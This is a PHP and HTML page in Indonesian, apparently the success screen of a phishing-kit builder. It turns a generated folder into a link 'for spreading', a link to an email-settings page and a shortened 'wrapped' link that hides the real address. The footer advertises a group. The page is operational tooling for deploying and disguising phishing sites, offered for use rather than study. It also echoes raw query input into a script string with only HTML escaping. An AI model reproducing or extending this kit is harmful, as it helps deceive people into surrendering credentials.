<?php
include 'shortlink.php';
$subdomain = $_GET['folder'];
$domain = $_SERVER['SERVER_NAME'];
$longURL = $domain . '/' . $subdomain;
$shortenedURL = shortenURL($longURL);
?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
  <title>Link Berhasil Dibuat | ARYA TQHIO</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');

    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(145deg, #0050FF, #3B82F6); /* biru gradien sesuai index */
      color: #1E40AF; /* biru tua teks */
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
    }

    .glass {
      background: rgba(255, 255, 255, 0.9); /* putih transparan */
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      border: 1px solid rgba(59, 130, 246, 0.4); /* border biru */
      box-shadow: 0 10px 25px rgba(59, 130, 246, 0.25);
      border-radius: 1.25rem;
      max-width: 400px;
      width: 100%;
      padding: 2rem;
      text-align: center;
    }

    h1 {
      color: #F97316; /* oranye tombol index */
      font-weight: 700;
      margin-bottom: 1rem;
      font-size: 2rem;
    }

    p {
      color: #2563EB; /* biru medium */
      margin-bottom: 1.5rem;
    }

    label {
      display: block;
      font-weight: 600;
      margin-bottom: 0.25rem;
      color: #2563EB; /* biru medium */
      text-align: left;
    }

    .input-box {
      background-color: #EFF6FF; /* biru muda */
      border: 1.5px solid #3B82F6; /* border biru */
      color: #1E40AF; /* teks biru tua */
      border-radius: 0.5rem;
      padding: 0.5rem 1rem;
      width: 100%;
      font-size: 1rem;
      margin-bottom: 1rem;
      user-select: all;
    }

    .btn-elegant {
      background: linear-gradient(to right, #F97316, #ea6f0f); /* oranye gradien */
      color: white;
      font-weight: 600;
      border-radius: 0.5rem;
      padding: 0.75rem;
      width: 100%;
      cursor: pointer;
      transition: transform 0.2s ease, box-shadow 0.2s ease;
      border: none;
    }

    .btn-elegant:hover {
      transform: scale(1.02);
      box-shadow: 0 6px 20px rgba(249, 115, 22, 0.4);
    }

    footer {
      margin-top: 2rem;
      font-size: 0.75rem;
      color: #2563EB;
    }

    footer a {
      color: #2563EB;
      font-weight: 600;
      text-decoration: none;
    }

    footer a:hover {
      text-decoration: underline;
    }

    /* Toast notification */
    #toast {
      position: fixed;
      bottom: 1.5rem;
      left: 50%;
      transform: translateX(-50%);
      background-color: #16a34a; /* hijau */
      color: white;
      padding: 0.5rem 1.25rem;
      border-radius: 0.5rem;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
      opacity: 0;
      transition: opacity 0.3s ease;
      pointer-events: none;
      font-weight: 600;
      user-select: none;
      z-index: 9999;
    }

    #toast.show {
      opacity: 1;
      pointer-events: auto;
    }
  </style>
</head>
<body>

  <div class="glass">
    <h1>Sukses!</h1>
    <p>Link berhasil dibuat. Gunakan link di bawah untuk keperluan nebar atau promosi.</p>

    <div>
      <label for="link-nebar">Link Nebar</label>
      <input id="link-nebar" type="text" readonly class="input-box" value="https://<?= htmlspecialchars($domain) ?>/<?= htmlspecialchars($subdomain) ?>">
    </div>
    <div>
      <label for="link-setting">Link Setting Email</label>
      <input id="link-setting" type="text" readonly class="input-box" value="https://<?= htmlspecialchars($domain) ?>/<?= htmlspecialchars($subdomain) ?>/setting.php">
    </div>
    <div>
      <label for="link-short">Link Web Sudah Di Bungkus</label>
      <input id="link-short" type="text" readonly class="input-box" value="<?= htmlspecialchars($shortenedURL) ?>">
    </div>

    <button onclick="copyToClipboard()" class="btn-elegant mt-4">Salin Link</button>
    <button onclick="bukaSetting()" class="btn-elegant mt-2">Buka Setting</button>

    <footer>
      GRUB WEBP CHAYO SR<a href="https://cdn.stackpath.web.id/joingb" target="_blank" rel="noopener noreferrer">.   KLIK DI SINI</a>
    </footer>
  </div>

  <div id="toast">Link berhasil disalin!</div>

  <script>
    function showToast(msg) {
      const toast = document.getElementById('toast');
      toast.textContent = msg;
      toast.classList.add('show');
      setTimeout(() => {
        toast.classList.remove('show');
      }, 3000);
    }

    function copyToClipboard() {
      const shortUrl = document.getElementById("link-nebar").value;
      navigator.clipboard.writeText(shortUrl)
        .then(() => showToast("Link berhasil disalin!"))
        .catch(() => showToast("Gagal menyalin link."));
    }

    function bukaSetting() {
      const subdomain = "<?= htmlspecialchars($subdomain) ?>";
      window.location.href = `https://<?= htmlspecialchars($domain) ?>/${subdomain}/update.php`;
    }
  </script>

</body>
</html>
